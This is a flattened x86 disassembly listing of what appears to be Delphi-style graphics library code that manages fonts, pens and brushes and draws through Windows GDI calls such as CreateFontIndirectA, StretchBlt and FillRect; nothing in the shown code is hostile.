movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_422d88
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_422dfc
xor edx edx
push ebp
push sub_422ee8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422eef
mov eax [ ebp - 0x4 ]
call sub_422e08
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_40279c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_402998
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_40809c
test al al
je r-xdata
sub_422ef8
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_422dfc
xor ecx ecx
push ebp
push sub_422f7f
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_422e08
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_422fa8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_422dfc
xor eax eax
push ebp
push sub_423011
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_422e14
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_422ef8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423018
mov eax [ ebp - 0x4 ]
call sub_422e08
retn
mov eax ebx
mov si 0xfffd
call sub_403430
sub_423020
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_422dfc
xor eax eax
push ebp
push sub_42307c
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423083
mov eax [ ebp - 0x4 ]
call sub_422e08
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_403430
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_422ef8
sub_42308c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_422dfc
xor edx edx
push ebp
push sub_4230eb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4230f2
mov eax [ ebp - 0x4 ]
call sub_422e08
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_4230f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_41a82c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_423195
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41a468
mov ebx eax
mov eax ebx
call sub_4246c4
inc [ ebp - 0x4 ]
mov eax ebx
call sub_4249d8
mov eax [ rw-data ]
call sub_42308c
mov eax [ rw-data ]
call sub_42308c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42319c
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_41a890
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_41a468
call sub_4248b0
inc esi
dec ebx
jne r-xdata
sub_4237eb
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_419f18
retn
sub_42381c
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402d40
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402b30
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_4238d0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_422e14
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_423924
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_422ef8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_423968
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41aa64
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_423628
xor eax eax
push ebp
push sub_423a23
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_423628
xor eax eax
push ebp
push sub_423a06
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_423020
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_423aa4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423a0d
mov eax [ ebp - 0x8 ]
call sub_423638
retn
mov eax ebx
call sub_423d28
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_423d44
sub_423a54
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423628
xor eax eax
push ebp
push sub_423a99
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422fa8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423aa0
mov eax [ ebp - 0x4 ]
call sub_423638
retn
sub_423ab8
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_423c41
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423c48
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_40402c
retn
mov eax [ rw-data ]
call sub_422dfc
xor eax eax
push ebp
push sub_423c19
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_422e08
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_40426c
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_408a2c
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_40426c
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_408a2c
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_40426c
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_4081d4
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_423d9c
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_423c60
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_42381c
mov edx esp
mov eax ebx
call sub_423a54
add esp 0x2c
pop esi
pop ebx
retn
sub_423c8c
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_423a3c
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_423a54
add esp 0x2c
pop esi
pop ebx
retn
sub_423ccc
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_423a3c
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402c40
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_4042a4
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402b30
mov edx esp
mov eax ebx
call sub_423a54
sub_423d44
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_423c8c
pop esi
pop ebx
retn
sub_423d70
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_423a3c
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_423a54
add esp 0x30
pop ebx
retn
sub_423da4
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_423a3c
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_423a54
add esp 0x2c
pop esi
pop ebx
retn
sub_423dd4
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_423a3c
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_423a54
add esp 0x2c
pop esi
pop ebx
retn
sub_423dfc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_422e14
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_423e40
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_422ef8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_423e68
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41aa64
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_423628
xor eax eax
push ebp
push sub_423f07
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_423628
xor eax eax
push ebp
push sub_423eea
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_423020
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_424050
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423ef1
mov eax [ ebp - 0x8 ]
call sub_423638
retn
sub_423f20
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_423f38
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423628
xor eax eax
push ebp
push sub_423f7d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422fa8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423f84
mov eax [ ebp - 0x4 ]
call sub_423638
retn
sub_423f90
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_423f20
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_423f38
add esp 0x10
pop esi
pop ebx
retn
sub_423fb8
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_422dfc
xor eax eax
push ebp
push sub_42403e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_422e08
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4235e4
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_42406c
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_423f20
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_423f38
add esp 0x10
pop esi
pop ebx
retn
sub_42409c
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_423f20
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_423f38
sub_4240c8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_422e14
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_424108
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_422ef8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_424130
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41aa64
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_423628
xor eax eax
push ebp
push sub_4241c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_423628
xor eax eax
push ebp
push sub_4241a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_423020
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4241aa
mov eax [ ebp - 0x8 ]
call sub_423638
retn
sub_4241d8
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_4241f4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423628
xor eax eax
push ebp
push sub_424239
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422fa8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424240
mov eax [ ebp - 0x4 ]
call sub_423638
retn
sub_424244
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_4241f4
add esp 0x10
pop edi
pop esi
retn
sub_424270
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_4241d8
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_4241f4
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_4242a4
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_422dfc
xor edx edx
push ebp
push sub_424371
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_422e08
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4235e4
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_42438c
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_4241d8
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_4241f4
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_4243c0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403204
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_4238d0
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_424c00
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423dfc
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_424c20
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4240c8
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_424c40
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_41a7a4
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_424484
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_41a840
xor edx edx
mov eax esi
call sub_424a38
mov eax [ esi + 0xc ]
call sub_403234
mov eax [ esi + 0x10 ]
call sub_403234
mov eax [ esi + 0x14 ]
call sub_403234
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41aa38
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_4244e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424a8c
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_424a8c
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_424568
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424a8c
mov eax [ ebx + 0x14 ]
call sub_424268
call sub_4235e4
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_4235e4
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_419034
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_424614
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424a8c
mov eax [ ebx + 0x14 ]
call sub_4242a4
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_424650
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
